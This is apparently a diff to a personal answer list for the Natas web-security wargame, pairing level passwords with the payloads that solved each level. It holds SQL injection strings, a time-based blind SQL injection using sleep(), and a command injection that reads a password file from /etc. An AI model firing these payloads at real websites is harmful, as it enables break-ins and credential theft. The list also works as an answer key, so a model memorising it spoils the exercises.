@@ -15,5 +15,5 @@
 14 - Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1 - /?debug&username="%20or%20"1"%20=%20"1"%20--%20&password=
 15 - AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J - /?debug&username=natas16"%20and%20password%20like%20binary%20%20%20"W%
 16 - WaIHEacj63wnNIBROHeqi3p9t0m5nhmh - /?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)
-17 - 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw - 
-18 -  -
+17 - 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw - ?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23
+18 - xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP - 
